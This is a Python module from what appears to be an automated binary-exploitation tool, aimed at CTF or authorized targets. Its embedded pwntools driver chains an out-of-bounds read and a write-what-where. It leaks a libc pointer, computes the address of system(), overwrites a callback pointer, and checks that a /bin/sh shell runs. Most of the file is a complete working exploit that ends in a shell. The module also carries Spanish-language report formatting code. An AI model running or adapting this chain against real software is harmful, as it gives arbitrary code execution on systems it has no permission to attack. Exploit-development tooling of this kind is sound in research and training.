"""Automatic infoleak chaining: an out-of-bounds read leak feeds a follow-on write-what-where
hijack, verified as ONE exploit by getting a real shell -- not two separate findings (a "there
is an OOB read" finding and a "there is a write-what-where" finding, left for a human to
compose by hand).

Shape: a single indexable array bug (`table[idx]`, no bounds check) is used twice in the SAME
run. First as a READ: an attacker-chosen negative/out-of-range index reaches a neighbouring
global that already holds a real, resolved libc pointer (e.g. `printf_leak = printf`) -- the
leaked value is genuinely unknown ahead of time (it depends on the libc build/ASLR slide of
THIS run, never hardcoded or peeked from /proc/maps). From it: `libc_base = leaked -
libc.symbols[fn]`, then `system = libc_base + libc.symbols['system']`. Second as a WRITE: the
same indexable bug overwrites a neighbouring function-pointer global (`callback`) with the
computed `system` address; calling it (with a known, static `/bin/sh` argument already in the
target -- no leak needed for that part) spawns a shell. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, process, context
name = sys.argv[1]
context.log_level = "error"
elf = ELF(name, checksec=False)
if elf.bits != 64:
    print("NOT_APPLICABLE (leak-chain driver is x86-64)"); sys.exit(1)

table = (elf.symbols or {}).get("table")
cb = (elf.symbols or {}).get("callback")
leak_sym, leak_addr = None, None
for cand in ("printf_leak", "puts_leak", "libc_leak"):
    if cand in (elf.symbols or {}):
        leak_sym, leak_addr = cand, elf.symbols[cand]; break
if table is None or leak_addr is None or cb is None:
    print("NOT_APPLICABLE (no known table/<fn>_leak/callback symbols)"); sys.exit(1)
leak_fn = leak_sym.rsplit("_leak", 1)[0]

libc = elf.libc
if libc is None or leak_fn not in (libc.symbols or {}):
    print("NOT_APPLICABLE (no dynamically linked libc, or %s not in it)" % leak_fn)
    sys.exit(1)

idx_leak = (leak_addr - table) // 8
idx_cb = (cb - table) // 8
MARK = b"BINORACLE_LEAKCHAIN_PWNED"

io = None
try:
    io = process([name])
    io.recvuntil(b"> ")
    io.sendline(b"1")                                  # 1) read idx -- the OOB READ leak
    io.recvuntil(b"idx: ")
    io.sendline(str(idx_leak).encode())
    line = io.recvline()
    leaked = int(line.split(b"val: ")[1].strip(), 16)   # genuinely unknown until this run
    libc_base = leaked - libc.symbols[leak_fn]
    system_addr = libc_base + libc.symbols["system"]

    io.recvuntil(b"> ")
    io.sendline(b"2")                                   # 2) write idx,val -- the follow-on hijack,
    io.recvuntil(b"idx: ")                               #    informed entirely by the leak above
    io.sendline(str(idx_cb).encode())
    io.recvuntil(b"val: ")
    io.sendline(str(system_addr).encode())
    io.recvuntil(b"> ")
    io.sendline(b"3")                                    # 3) call callback("/bin/sh") -> shell
    time.sleep(0.25)
    io.sendline(b"echo " + MARK + b"; id")
    time.sleep(0.35)
    out = io.recvrepeat(1.1)
    io.close()
    if MARK in out or b"uid=" in out:
        print("VERIFIED leak_fn=%s leaked=%#x libc_base=%#x system=%#x idx_leak=%d idx_cb=%d"
              % (leak_fn, leaked, libc_base, system_addr, idx_leak, idx_cb))
        sys.exit(0)
except Exception:
    try:
        if io: io.close()
    except Exception: pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autoleakchain(binary: str) -> dict:
    """Infoleak chaining (OOB read -> libc_base -> write-what-where -> system('/bin/sh')),
    verificado como UNA sola cadena por ejecucion, no dos hallazgos sueltos."""
    res = run_driver(binary, _DRIVER, ".binoracle_leakchain.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"infoleak chaining (OOB read -> write-what-where -> shell): verificado "
                   f"por ejecucion ({eng})"
                   if res.get("verified")
                   else f"infoleak chaining: no verificado ({eng}) (sin table/<fn>_leak/"
                        f"callback conocidos, sin libc dinamica, o timing)")
    return res


def render_leakchain(r: dict) -> str:
    out = ["## Auto infoleak chaining (OOB read -> write-what-where, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
